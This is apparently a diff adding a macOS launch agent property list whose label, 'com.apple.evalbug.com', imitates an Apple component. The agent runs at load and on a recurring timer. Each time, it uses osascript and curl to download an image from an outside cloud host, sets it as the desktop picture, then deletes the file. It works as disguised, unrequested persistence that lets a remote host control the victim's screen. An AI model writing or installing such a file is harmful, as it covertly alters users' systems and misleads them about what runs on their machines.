@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+        <string>com.apple.evalbug.com</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>osascript</string>
+        <string>-e</string>
+        <string>do shell script "curl -so /tmp/1.jpeg http://7xtigg.com1.z0.glb.clouddn.com/timg%20.jpeg"</string>
+        <string>-e</string>
+        <string>tell application "Finder" to set desktop picture to POSIX file "/tmp/1.jpeg"</string>
+        <string>-e</string>
+        <string>do shell script "rm -f /tmp/1.jpeg"</string>
+    </array>
+    <key>RunAtLoad</key>
+        <true/>
+    <key>StartCalendarInterval</key>
+    <dict>
+        <key>Second</key>
+        <integer>1</integer>
+    </dict>
+</dict>
+</plist>
